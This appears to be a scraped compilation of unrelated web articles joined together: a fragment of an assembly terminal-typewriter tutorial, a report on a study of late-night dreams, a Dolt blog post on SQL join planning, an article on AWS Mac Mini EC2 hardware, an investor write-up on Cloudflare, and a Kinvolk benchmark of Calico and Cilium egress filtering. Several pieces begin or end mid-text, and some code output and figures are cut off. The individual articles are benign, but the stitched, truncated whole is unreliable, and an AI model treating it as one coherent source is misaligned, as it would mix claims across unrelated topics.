    <span>mov</span> <span>rdx</span><span>,</span> <span>winsz</span>       <span>; winsz struct will contain terminal size information</span>
    <span>mov</span> <span>rax</span><span>,</span> <span>SYS_IOCTL</span>
    <span>syscall</span>
    
    <span>call</span> <span>create_cursor</span>   <span>; creating ANSI code that moves to proper coordinates (result format: "ESC[x;yH")</span></code></pre></div><p>
​       It will populate <code>winsz</code> struct with the result values. More information on the <code>TIOCGWINSZ</code> command can be found <a href="http://www.delorie.com/djgpp/doc/libc/libc_495.html">here</a></p>

<div><pre><code data-lang="nasm"><span>struc</span><span>t</span> <span>WINSZ</span>
    <span>.ws_row</span>     <span>dw</span> <span>?</span>     <span>; rows, in characters</span>
    <span>.ws_col</span>     <span>dw</span> <span>?</span>     <span>; columns, in characters</span>
    <span>.ws_xpixel</span>  <span>dw</span> <span>?</span>     <span>; horizontal size, pixels</span>
    <span>.ws_ypixel</span>  <span>dw</span> <span>?</span>     <span>; vertical size, pixels</span>
<span>ends</span></code></pre></div>

<ul>
<li>Creating the initial cursor we will use as starting point to write our message. Basically we divide the screen rows and columns by <code>3</code> in order to get a nice centralized final output. Feel free to play around with this denominator for different results. The function below will construct the <code>ESC[x;yH</code> string into <code>cursor_buffer</code> and replace <code>x</code> and <code>y</code> with the result of our small division, rounding up if needed</li>

<li>What’s left now is to actually write our message to the screen, remember we are using <code>nanosleep</code> syscall to add some delay achieve a typewriter effect, so we will loop through our message byte by byte and write each byte to <code>STDOUT</code>. We also have to keep generating cursors with new <code>(x, y)</code> coordinates to move the input position around like a typewriter would (we can use <code>create_cursor</code> function again for that).</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-5816" role="main">

<div>
<p>A <a href="https://www.sciencedirect.com/science/article/pii/S1053810020305389" target="_blank" rel="noreferrer noopener">new study</a> has found that the later it is, the more likely people are to have weird dreams.<span data-ez-name="psychnewsdaily_com-medrectangle-3"></span></p>
<p>The study adds to the <a href="https://amzn.to/2Kx7WKB" target="_blank" rel="noreferrer noopener">growing body of academic research on dreams</a>, a burgeoning field also known as <a href="https://en.wikipedia.org/wiki/Oneirology" target="_blank" rel="noreferrer noopener">oneirology</a>.</p>
<p>The study appeared on December 25 in the journal <em><a href="https://www.journals.elsevier.com/consciousness-and-cognition/" target="_blank" rel="noreferrer noopener">Consciousness and Cognition</a></em>. It was based on 68 students (58 of whom were female) at two universities in the United Kingdom. Their average age was 25. </p>
<h2>From crazy dreams to creepy dreams, and everything in between</h2>
<p>On two non-consecutive nights, a pre-programmed alarm clock woke the participants up four times throughout the night, at two-hour intervals. Upon each waking, they spoke into a digital audio device to record the contents any dream they might have been having. </p>
<p>The next morning, they listened to their recordings and completed a form that contained questions about each dream. The questions asked, for example, how bizarre the dream was on a scale of one to nine, how intense it was, how related the dream was to the dreamer’s waking life (past, present, or future), what emotions it conjured up, etc.<span data-ez-name="psychnewsdaily_com-medrectangle-4"></span></p>
<p>The average number of dreams that each participant recorded across the eight “awakenings” was about five.</p>
<p>The researchers, Josie Malinowski and Caroline Horton, grouped these dreams into two categories. The first consisted of “early night” dreams, consisting of dreams recorded after the two-hour and four-hour awakenings (in other words, dreams that took place during the first four hours of sleep). The second category consisted of “late night” dreams, recorded after the six-hour and eight-hour awakenings (i.e., during the second four hours of sleep). This categorization resulted in 173 early-night dreams and 177 late-night dreams.</p>
<h2>The wee hours are rife with weird dreams</h2>
<p>The results showed that late-night dreams were rated as substantially more bizarre and more metaphorical than early-night dreams. The participants also considered their late-night dreams more emotional, more intense, and more “important” than early-night dreams. Likewise, the late-night dreams were more likely to involve the distant past.</p>
<p>In contrast, the participants reported that their early-night dreams were more related to their waking life than the late-night dreams. The researchers found no differences between late-night and early-night dreams in terms of their stressfulness or negative valence.<span data-ez-name="psychnewsdaily_com-box-4"></span></p>
<p>The study also included several examples that the researchers say typify the early-night or late-night dreams of this sample group. One early-night dream, for example, was about the dreamer going on a shopping spree in a mall. In contrast, a typical late-night dream involved an exam session that morphed into a party with the party-goers clad in Victorian clothes, and where time itself was dancing.</p>
<h2>Bizarre dream images, new dream theories</h2>
<p>The fact that “dream-like” cognition increases in step with the amount of time spent asleep reflects “the change towards fluid, creative, and hyperassociative cognitive processes that underlie sleep towards the latter part of the night,” the researchers write.</p>
<p>And these differences in dream content may also relate to different sleep-related processes. The activation of memories during sleep, for example, <a href="https://www.frontiersin.org/articles/10.3389/fpsyg.2015.00874/full" target="_blank" rel="noreferrer noopener">probably has to do with memory consolidation</a>. Knowing more about how dream content changes over the course of the night “can provide insights into the nature of these processes of memory activation,” the authors write.</p>
<p>“Taken together, the increase in bizarreness, metaphoricity, and time orientation variance of late-night dreams show several ways in which late-night sleep cognition tends to be more fluid, creative, and associative than early-night dreams,” the study proposes.</p>
<p>Of course, this study reflects the dreams of a relatively small group of mostly young women based at British universities. As such, a broader sample pool might lead to different findings.</p>
<h2>“I have such funny dreams…” </h2>
<p>Likewise, the study is based entirely on the participants’ self-reports, in line with other <a href="https://www.psychnewsdaily.com/how-sharing-your-dreams-could-help-to-improve-your-relationships/" target="_blank" rel="noreferrer noopener">dream research</a>. But the researchers maintain that self-rating is the most appropriate method for determining the “bizarreness” of a dream. That is <a href="https://www.semanticscholar.org/paper/The-Problem-of-Dream-Content-Analysis-Validity-as-a-Schredl/34a69af866262c4514ecddf2ca2a72c5b6c451c2" target="_blank" rel="noreferrer noopener">because past research has found</a> that “external raters underestimate the amount of bizarreness in a dream in comparison to dreamers’ own ratings.” This finding can be confirmed by anyone who has ever listened to a description of someone else’s ostensibly weird dreams.</p>
<p>But the fact that someone describes a given dream as weird is fully understandable. The “intense (hyper)connectivity” of some dreams, the study writes, “may bring together memories, thoughts, and experiences from seemingly unrelated components of the dreamer’s life.”</p>
<p>The authors suggest future research could investigate whether people with more bizarre dreams also score higher on creativity measurements.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text">
<p><a href="https://github.com/dolthub/dolt/">Dolt</a> is Git for Data. It's a SQL
database that you can clone, fork, branch, and merge. Dolt's SQL
engine is
<a href="https://github.com/dolthub/go-mysql-server/">go-mysql-server</a>, and
today we're going to discuss how it implements join planning to make a
query plan involving multiple tables as efficient as possible.</p>

<p>When a query involves more than one table, there are many different
ways to access those tables to get a correct result. But some ways are
much faster than others! Choosing an order to access tables in and a
strategy to assemble result rows is known as join planning. This is
easiest to explain with an example.</p>
<p>Let's create three tables to track the populations of cities and
states, and the people who live in them. If you have Dolt installed
(link in the sidebar), you can follow along.</p>
<div data-language="sql"><pre><code><span>%</span> mkdir <span>join</span><span>-</span>planning <span>&amp;&amp;</span> cd <span>join</span><span>-</span>planning
<span>%</span> dolt init
Successfully initialized dolt <span>data</span> repository<span>.</span>
<span>%</span> dolt <span>sql</span>



join_planning<span>&gt;</span> <span>create</span> <span>table</span> states <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> population <span>int</span> <span>unsigned</span><span>)</span><span>;</span>
join_planning<span>&gt;</span> <span>create</span> <span>table</span> cities <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> state <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>not</span> <span>null</span><span>,</span> population <span>int</span> <span>unsigned</span><span>)</span><span>;</span>
join_planning<span>&gt;</span> <span>create</span> <span>table</span> people <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> city <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>not</span> <span>null</span><span>)</span><span>;</span></code></pre></div>
<p>Let's say that we want a list of people named "John Smith" along with
names and populations of the cities and states they live in. We would
write a query like this:</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> people p 
    <span>join</span> cities c <span>on</span> p<span>.</span>city <span>=</span> c<span>.</span>name 
    <span>join</span> states s <span>on</span> s<span>.</span>name <span>=</span> c<span>.</span>state 
    <span>where</span> p<span>.</span>name <span>=</span> <span>"John Smith"</span><span>;</span></code></pre></div>
<p>There's lots of ways that a query planner could execute this query. A
really bad way would be to look at every combination of every row from
all three tables and test each combination to see if it matches the
<code>JOIN</code> condition and <code>WHERE</code> clause. This is correct and valid, but
very expensive. If we say that the <code>states</code>, <code>cities</code> and <code>people</code>
tables contain <code>S</code>, <code>C</code> and <code>P</code> rows respectively, this query plan
(which is called a cross join), will result in <code>S * C * P</code> row
accesses and comparisons. It's a bad idea. </p>
<p>There are simple tricks you can use to speed up query execution. Using
<a href="https://www.dolthub.com/blog/2020-10-28-pushdown-filters/">pushdown
optimization</a>,
you can eliminate most of the accesses to the <code>people</code> table. Let's
say that the number of "John Smiths" in the database is called <code>J</code>,
and it's much smaller than <code>P</code>. Then using pushdown intelligently
reduces the cost of our access to <code>S * C * J</code>.</p>
<p>Until a few weeks ago, this was as good as
<a href="https://github.com/dolthub/dolt/">Dolt</a> could do on joins of three or
more tables. For two tables, we would use an index if available. But
for three, no luck. It made the product borderline unusable for a
workload with this query pattern and a non-trivial data size.</p>
<p>This blog post is about how we optimized the join planner to generate
more intelligent, efficient query plans for any number of tables. In
today's version of <a href="https://github.com/dolthub/dolt/">Dolt</a>, that same
query will generate the following query plan:</p>
<div data-language="sql"><pre><code>join_planning<span>&gt;</span> <span>explain</span> <span>select</span> <span>*</span> <span>from</span> people p 
    <span>join</span> cities c <span>on</span> p<span>.</span>city <span>=</span> c<span>.</span>name 
    <span>join</span> states s <span>on</span> s<span>.</span>name <span>=</span> c<span>.</span>state

<span>+</span></code></pre></div>
<p>The plan starts with an indexed access on the <code>name</code> column of
<code>people</code> to find all the John Smiths. Then for each row, it uses a
primary key index to look up the city. Then for each city, it uses
another primary key to look up the state. In all, this leads to a
total query cost of <code>J * 3</code>. </p>
<h2>Is that... a lot?</h2>
<p><img src="https://www.dolthub.com/blog/1e2adb7b32ddb47442f1c254bf2358ed/is-that-a-lot.gif" alt="Is that a lot?"></p>
<p>Using some real numbers to drive this home: let's use the US and say
that there are 330,000,000 <code>people</code> rows, 20,000 <code>cities</code> rows, and 52
<code>states</code> rows (we didn't forget you, DC and Puerto Rico). A cross join
query plan would access a number of rows equal to the product of these
numbers, which is roughly 343 trillion accesses. It's a big
number. Your query isn't going to complete.</p>
<p><a href="http://howmanyofme.com/#:~:text=The%20U.S.%20Census%20Bureau%20statistics,Smith%20in%20the%20United%20States.">There are about 48,000 people named John
Smith</a>
in the US. So using pushdown optimization gets us down to about 50
billion row accesses. This is a lot better than before, but still
terrible. The query isn't returning.</p>
<p>Using both pushdown to the <code>people</code> table and indexed accesses to
<code>cities</code> and <code>states</code>, on the other hand, limits the query execution
to only 48,000 accesses to the <code>people</code> table, then 1 access to each of
the <code>cities</code> and <code>states</code> table for each of these rows. That's <code>3 *
48,000</code>, or 144,000 table accesses total.</p>

</table>
<p>Unlike in the <a href="https://www.dolthub.com/blog/2020-10-28-pushdown-filters/">pushdown
blog</a>, I
won't bother to spell out the percentage savings. We're looking at 4
decimal orders of magnitude improvement for the first optimization,
then another 5 for the second. It's the difference between
<a href="https://github.com/dolthub/dolt/">Dolt</a> being a usable query engine
or a bad space heater.</p>

<p>To assemble an efficient query plan, you have to start by by answering
one really important question:</p>
<blockquote>
<p>What order should we access the tables in?</p>
</blockquote>
<p>This really makes all the difference. In the example above, a table
access order of <code>people &gt; cities &gt; states</code> lets us use the primary key
index on the latter two tables. If we instead chose the order <code>states &gt; cities &gt; people</code>,
we can't use the information from earlier tables
to reduce the number of lookups into later tables, giving us a cross join.</p>
<p>There are a lot of interesting details to get wrong, but to get table
order right you can use some pretty simple heuristics.</p>
<ol>
<li><strong>What index could I use</strong> to access this table? Are those columns part
of a join condition?</li>
<li><strong>Are required columns available to use as a key</strong>? Did the other tables
in the join condition precede this one?</li>
<li><strong>How many rows are in this table</strong> if I need to do a full table scan?</li>
<li><strong>Is this a <code>LEFT</code> or <code>RIGHT</code> join</strong>, and if so, is this table on the
side of the join that requires it to come first?</li>
</ol>
<p>We'll come back to the actual implementation of the table ordering
algorithm later. For now let's assume its existence, and it tells us
which order to access tables in. How do we build a join plan with that
access order?</p>

<p>In <a href="https://github.com/dolthub/go-mysql-server/">go-mysql-server</a>,
query plans are organized in a tree of <code>Node</code> objects. As of now, all
nodes have at most two children, making the query plan a binary-ish
tree. A <code>Join</code> node knows how to get a row from its left child, then
iterate over its right child looking for matches on the join
condition. When the right child iterator is out of rows, it gets the
next row from its left child. Eventually it runs out of rows in the
left child and returns <code>io.EOF</code> from its iterator.</p>
<p>Like everything else, this is easiest to visualize with some
examples. For all of these, we'll use one-letter table names with
single columns that match the table name. Here's a simple join between
two tables A and B:</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> A <span>join</span> B <span>on</span> a <span>=</span> b<span>;</span></code></pre></div>
<p>A naive query plan looks like this:</p>

<p>As we add additional tables to the join, they become the new root of
the tree, with the original subtree as the left child.</p>

    </span></p>
<p>Let's examine this last example more closely. What happens when we
open an iterator on the root <code>Node</code> of the query? It opens an iterator
on its left child, which in turn opens an iterator on its left child,
and so on. Each node, after accessing a row from its left child, then
attempts to find a matching row from its right child. We end up with
the table access order the same as in the lexical query: <code>A &gt; B &gt; C &gt;
D</code>. </p>
<p>Let's trace through the execution of a single row in the result set.</p>
<ol>
<li>The join node <code>a = b</code> gets a row from <code>A</code>. Then it iterates through
the rows of <code>B</code> looking for rows that match the join condition <code>a =
b</code>. When it finds such a row, it returns it.</li>
<li>The node <code>b = c</code> takes the row from its left child, which is a
concatenation of rows from tables <code>A</code> and <code>B</code>. It then iterates
over its right child, the rows of <code>C</code>, looking for rows that match
the join condition <code>b = c</code>. When it finds such a row, it returns
it.</li>
<li>The node <code>c = d</code> takes the row from its left child, which is a
concatenation of rows from <code>A</code> and <code>B</code> and <code>C</code>, in that order. It
then attempts to match rows from its right child, <code>D</code>, just as
above.</li>
</ol>
<p>Importantly, there are sometimes many possible binary trees that can
implement the above logic to yield a correct result for any given
table access order. The tree construction algorithm above, where we
keep shoving a sub-tree down to the left child of a new join node, is
just what the parser gives us by default because it's left
associative. But we can draw other trees that give the same
results. For example, here's a balanced join tree:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/d9217/four-table-balanced.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="balanced four table join" title="balanced four table join" src="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/ad12c/four-table-balanced.png" srcset="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/a48b3/four-table-balanced.png 214w,
https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/47730/four-table-balanced.png 428w,
https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/ad12c/four-table-balanced.png 856w,

  </a>
    </span></p>
<p>Like the original, this produces a table access order of <code>A &gt; B &gt; C &gt;
D</code>. If we wanted to access the tables in the opposite order, we could
simply flip the left and right children of every node in the original
tree like so:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/0ad97/four-table-reversed.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="reversed four table join" title="reversed four table join" src="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/0ad97/four-table-reversed.png" srcset="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/a48b3/four-table-reversed.png 214w,
https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/47730/four-table-reversed.png 428w,
https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/0ad97/four-table-reversed.png 717w" sizes="(max-width: 717px) 100vw, 717px" loading="lazy">
  </a>
    </span></p>
<p>Again, there are sometimes many possible join trees for a given table
ordering. But they all have one thing in common: their join conditions
refer to tables that can be found in their left and right
children. Otherwise, the node cannot evaluate its join condition. For
example, let's say that we are querying three tables and want to
access them in the order <code>B &gt; A &gt; C</code>. This is an invalid join plan
with that table ordering:</p>

            <!-- content --><p>Since this is a holiday week, and we tend to do a bit more fun content. I wanted to take a look at how Amazon AWS is adding Apple Mac Mini nodes to EC2. We recently covered the announcement in <a href="https://www.servethehome.com/amazon-aws-ec2-mac-mini-powered-macos-cloud-instances-launched/">Amazon AWS EC2 Mac Mini Powered MacOS Instances Launched</a>, but now we have some pictures of the solution.<span id="more-49658"></span></p>
<h2>How AWS Added Apple Mac Mini Nodes to EC2</h2>
<p>This is what an x86/ 10GbE Apple Mac Mini looks like in an EC2 rack. One can see that the unit is placed in a sled. Around the Mac Mini are a surprising number of wires being routed through the chassis.</p>
<figure id="attachment_49661" aria-describedby="caption-attachment-49661"><a href="https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/aws-ec2-apple-mac-mini-node-in-rack/" rel="attachment wp-att-49661"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack.jpg" alt="AWS EC2 Apple Mac Mini Node In Rack" width="1253" height="638" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack.jpg 1253w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-400x204.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-800x407.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-696x354.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-1068x544.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-825x420.jpg 825w" sizes="(max-width: 1253px) 100vw, 1253px"></a><figcaption id="caption-attachment-49661">AWS EC2 Apple Mac Mini Node In Rack</figcaption></figure>
<p>Many of these wires terminate at the front of the sled. Here, we have an AWS Nitro controller. Amazon is now on its fourth generation of Nitro controller after starting the journey years ago.</p>
<figure id="attachment_49659" aria-describedby="caption-attachment-49659"><a href="https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/aws-nitro-to-nitro4/" rel="attachment wp-att-49659"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-scaled.jpg" alt="AWS Nitro To Nitro4" width="2560" height="688" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-scaled.jpg 2560w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-400x107.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-800x215.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-1536x413.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-2048x550.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-696x187.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-1068x287.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-1564x420.jpg 1564w" sizes="(max-width: 2560px) 100vw, 2560px"></a><figcaption id="caption-attachment-49659">AWS Nitro To Nitro4</figcaption></figure>
<p>We have covered this a number of times, but Nitro is effectively what the industry is trying to replicate (and expand upon) as part of the push towards DPUs. If you are not familiar with DPUs, check out our <a href="https://www.servethehome.com/what-is-a-dpu-a-data-processing-unit-quick-primer/">What is a DPU A Data Processing Unit Quick Primer</a> and video:</p>

<p>On the front of the AWS Mac Mini sled, there is the Nitro controller. There are two <a href="https://www.servethehome.com/exclusive-gigabyte-annapurna-labs-arm-storage-server-benchmarks/">Annapurna Labs</a> branded chips, one with what looks like five DRAM packages atop the PCB and one without. There is a red cable atop the Nitro PCB that almost looks like a standard SATA cable with a 90-degree connector.</p>

<p>AWS says it is using Thunderbolt to connect to the Mac Mini. Although most logos are covered up in AWS’s screenshot, we can see what appears to be (logo partially covered by a white label) a black Belkin Thunderbolt 3 cable on the bottom of the Nitro controller. Amazon said it is using Thunderbolt to connect its Nitro controller to the Mac Mini and provide its basic suite of EBS storage, networking, and security/ management features.</p>
<h2>Final Words</h2>
<p>Something important to keep in mind here is that the Mac Mini itself is a relatively lower cost versus the rest of AWS’s infrastructure to host the node versus many of AWS’s other EC2 offerings. It is also much more complex than something like a <a href="https://www.servethehome.com/myelectronics-nl-apple-mac-mini-and-raspberry-pi-rack-review/">Mac in a Rack</a> setup that we recently featured on STH.</p>
<p><iframe title="Rackmount Apple Mac Mini and Raspberry Pi" width="696" height="392" src="https://www.youtube.com/embed/t__DW0NbJIs?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>Overall, the big takeaway for our readers should be the impact of the AWS Nitro and why the industry is pushing so hard on DPUs right now. AWS is effectively using its Nitro controller as the endpoint so it can abstract the nodes it is putting on its network. Instead of having to re:Invent (yes that was purposeful) a new Mac OS stack, it could leverage Nitro and deliver its services over Thunderbolt. Some of the Thunderbolt changes in the M1 generation also may partially explain why AWS is using the older x86 nodes instead of newer M1 Arm nodes.</p>

<p>It has been a busy 2020 for Cloudflare. This company is my 2nd highest position (right behind CrowdStrike) as it sits at the nexus of two of the next-gen enterprise technology waves that I follow closely - <strong><a href="https://hhhypergrowth.com/tag/edge-networks/">Edge Networks</a></strong> and<strong> <a href="https://hhhypergrowth.com/tag/cybersecurity/">Zero Trust</a></strong>. Over the second half of 2020, it has had 4 different announcement weeks: Serverless Week, Birthday Week, Zero Trust Week, and Privacy &amp; Compliance Week. They are continually moving forward at an incredibly rapid pace, and while these announcement weeks are great for seeing the product innovations, it also gives us outsiders a view into <strong>how these moves fit into the larger picture</strong>. </p><p>And whoooo-boy... were there a lot of announcements. So many that it may look like they are moving in too many directions, or seem scattered or are stretching themselves thin. But no - <em>every</em> advance Cloudflare makes is improving either their core platform (web protection and performance), or one of the key directions I am watching them move more fully into. Instead of going one-by-one through the new products and features, let's instead look at what Cloudflare had before, the key platform areas that I am watching as an investor, and how those areas advanced. </p><p>I'm going to be referencing their prior products heavily. Pop quiz: What is Magic Transit, Argo, WARP? You need to know... so let's recap their product lines &amp; features stood (at the start of summer) before we explore the new enhancements.</p><hr><figure><img src="https://hhhypergrowth.com/content/images/2020/12/cloudflare_logo.png" alt="" srcset="https://hhhypergrowth.com/content/images/size/w600/2020/12/cloudflare_logo.png 600w, https://hhhypergrowth.com/content/images/2020/12/cloudflare_logo.png 874w" sizes="(min-width: 720px) 720px"></figure><p>This is mostly a recap from my <a href="https://hhhypergrowth.com/a-cloudflare-deep-dive/">first deep dive back in February 2020</a>, with a couple of additions and clarifications.</p><h2 id="core-platform">Core platform</h2><p>Cloudflare is an edge network, currently with 51Tb+ of global network capacity that is interconnecting with nearly 9000 outside networks (ISPs, cloud providers, internet exchanges, and customers). Their edge network is generally accessed via 200 Points of Presence (POPs), strategically situated across 100 countries – putting the vast majority of the world within 100ms of their edge. They handle 18M+ web requests per second on average, hitting 25M+ protected web sites and services -- which means they typically handle ~1.5 trillion web requests a day. The insights gained from handling all that traffic then powers a threat intel system that protects the edge network and its customers, which blocks an average of 72B cyberthreats a day. </p><p>Behind the core architecture of their platform is:</p><ul><li>Software Defined Networking = Cloudflare architected their global network and backbones to be software-based, which allows for their entire edge network to be programmable.

            <p>In a 


<a href="https://kinvolk.io/blog/2020/09/performance-benchmark-analysis-of-egress-filtering-on-linux/" target="_blank">recent blog
post</a>
, we
compared three different technical approaches to filtering egress traffic on Linux: IP tables, IP sets, and
BPF. While that provided some interesting baseline benchmarks of the core Linux technologies, we wanted to go
beyond that to look at how one would implement such filters in practice, using off-the-shelf cloud native
network policy solutions.</p>
<p>In the realm of the Cloud Native, it is not far-fetched to imagine a Kubernetes cluster needing egress
filtering for controlling the traffic (host or pod) attempting to leave the network to possibly wild and
dangerous endpoints on the internet. Indeed, this is a common use case for avoiding exfiltration of data by
malicious workloads.</p>
<p>One could of course build a custom egress filtering framework to suit the use case based on the existing
technologies in the Linux networking pipeline. Or one could take advantage of the Kubernetes CNI plugins that
already offer similar functionality.</p>
<p>Our friends at SAP asked us to perform a benchmark of the two most widely used Kubernetes CNIs, Calico and
Cilium, for this task. This blog post presents the methodology and results from benchmarking Calico and Cilium
deployed on a 


<a href="https://kinvolk.io/lokomotive-kubernetes/" target="_blank">Lokomotive</a>
 cluster.</p>
<h2 id="goals">Goals</h2>
<p>We had the following goals going into this study:</p>
<ul>
<li>Provide a reproducible benchmark framework that anyone can download and use.</li>
<li>Compare the scalability and potential performance overhead by Kubernetes CNI plugins such as Calico and
Cilium against using the underlying Linux filtering mechanisms (IP sets and eBPF, respectively).</li>
</ul>
<h2 id="about-calico">About Calico</h2>
<p>


<a href="https://www.projectcalico.org/" target="_blank">Calico</a>
 is the most popular open source CNI plugin for Kubernetes, according
to the recent 


<a href="https://www.datadoghq.com/container-report/" target="_blank">Datadog container survey</a>
. Calico not only
provides networking but also offers policy isolation for securing the Kubernetes cluster using advanced
ingress and egress policies.</p>
<p>Calico provides a choice of dataplane including a standard Linux networking dataplane (default), a pure Linux
eBPF dataplane and a Windows HNS dataplane.</p>
<h2 id="about-cilium">About Cilium</h2>
<p>


<a href="https://cilium.io/" target="_blank">Cilium</a>
, an increasingly popular open source Kubernetes CNI plugin, leverages eBPF to
address the networking challenges of container workloads such as scalability, security and visibility. Cilium
capabilities include identity-aware security, multi-cluster routing, transparent encryption, API-aware
visibility/filtering, and service-mesh acceleration.</p>
<h2 id="network-policies">Network Policies</h2>
<p>Kubernetes network policies are defined using the Kubernetes NetworkPolicy resource. However, Kubernetes
itself does not enforce network policies, and instead delegates their enforcement to the network plugins, in
our case Calico or Cilium.</p>
<p>Kubernetes NetworkPolicy resource is an application-centric construct i.e. it allows you to specify how a pod
is allowed to communicate with others Pods, Services, external Ingress or Egress traffic. However, it cannot
be used to enforce rules on a node or cluster level. Hence for egress filtering, we create network policies
using these CNI plugins’ custom APIs.</p>
<p>Calico provides its NetworkPolicy, GlobalNetworkPolicy and GlobalNetworkSet API objects which provide
additional features such as order, namespace scoped or cluster-wide enforcement of policies.</p>
<p>For Calico, we used GlobalNetworkSet API passing a  list of CIDRs that we want to deny egress to and then
reference the GlobalNetworkSet resource in the GlobalNetworkPolicy via label selectors.</p>
<p>Under the hood, this setup is similar to using IP sets for filtering egress traffic. Calico uses
GlobalNetworkSet to create IP sets and GlobalNetworkPolicy to update the iptables matching the IP set.</p>
<p>Cilium, on the other hand, uses eBPF as the underlying technology to enforce network policies. A Cilium agent
running on each host translates the network policy definitions to eBPF programs and eBPF maps and attaches
them to different eBPF hooks in the system. Network policy definitions are created with the help of
CiliumNetworkPolicy and CiliumClusterwideNetworkPolicy custom resources for namespace scoped and cluster-wide
network traffic respectively.</p>
<p>For Cilium, we used CiliumClusterwideNetworkPolicy API passing a list of CIDRs to deny egress and match the
policy using label selectors for both application workloads and network traffic on the host.</p>
<h2 id="metrics">Metrics</h2>
<p>Filtering network traffic could be a costly operation, especially if the number of rules to check is
considerably high — such as in millions (as is the case with a real-world scenario we are working on).
Throughput, CPU usage and latency must all be measured to provide a meaningful conclusion for the technologies
to be used.</p>
<p>We have used the following metrics to measure the performance of the filters:</p>
<ul>
<li>Throughput</li>
<li>CPU usage</li>
<li>Latency</li>
</ul>
<p>For a Kubernetes CNI an equally important metric is <code>Set-up time</code>. Since Calico/Cilium delegates the
responsibilities to the underlying technologies, we want to capture the time taken by the CNI plugin to
process the created API objects and enforce the network policies for egress filtering.</p>
<h2 id="scenario">Scenario</h2>
<p>The scenario for this test is, as in our



<a href="https://kinvolk.io/blog/2020/09/performance-benchmark-analysis-of-egress-filtering-on-linux/" target="_blank">previous</a>

egress filtering benchmark, composed of a client and a server computer that communicate through an IP network.
The egress filtering is performed on the client machine and there is no filtering performed on the server
side.</p>
<p>We test five possible mechanisms for doing the filtering:</p>
<ul>
<li>iptables, “raw” IP sets and tc-eBPF test application, as in the previous benchmark (retesting to ensure
consistency)</li>
<li>Calico and Cilium, in both cases running the client application in a pod in a Lokomotive Kubernetes cluster,
with the solution under test running as the Kubernetes CNI plug-in.</li>
</ul>
<p>In addition, for a baseline reference, we also ran the test without any filtering mechanism in place.</p>
<p>This is shown in the following diagram:</p>
<figure>
  <img src="https://kinvolk.io/media/2020-12-23-egress-filtering-with-calico-cilium/scenario.svg">
</figure>
<h2 id="benchmark-set-up">Benchmark Set-up</h2>
<p>As mentioned earlier, our set-up builds on the work of the existing framework.  Hence the software and
hardware profiles used to benchmark IP sets and tc-eBPF largely remain the same, except for the following
changes:</p>
<ul>
<li>Updated software versions for Flatcar, ipset, iperf and the Linux kernel.</li>
<li>Two Lokomotive clusters with one worker node to run the benchmarks, one each for Calico and Cilium.</li>
</ul>
<h3 id="hardware">Hardware</h3>
<p>To perform the test we used the following bare metal servers running on 


<a href="https://metal.equinix.com/" target="_blank">Equinix
Metal</a>
:</p>
<ul>
<li>2 machines as client and server machines for IP set and tc-eBPF filters.</li>
<li>2 machines for the Lokomotive cluster (1 controller, 1 worker) for benchmarking Calico.</li>
<li>2 machines for the Lokomotive cluster (1 controller, 1 worker) for benchmarking Cilium.</li>
</ul>
<p>The specifications of all the machines used were:</p>
